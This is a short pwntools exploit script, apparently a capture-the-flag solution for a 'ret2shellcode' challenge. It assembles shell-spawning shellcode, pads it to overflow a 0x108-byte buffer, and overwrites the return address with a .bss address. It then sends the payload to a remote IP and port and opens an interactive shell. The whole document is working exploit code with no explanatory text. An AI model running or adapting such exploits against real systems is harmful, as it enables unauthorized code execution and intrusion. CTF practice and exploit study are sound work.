from pwn import *
context(log_level='debug',os='linux',arch='amd64',terminal=['tmux','splitw','-h'])

# io=process("./ret2shellcode")
io=remote("43.143.7.127",28076)

bss_addr=0x4040a0
shellcode=asm(shellcraft.sh())
payload=shellcode.ljust(0x108,b"a")+p64(bss_addr)
io.send(payload)
io.interactive()












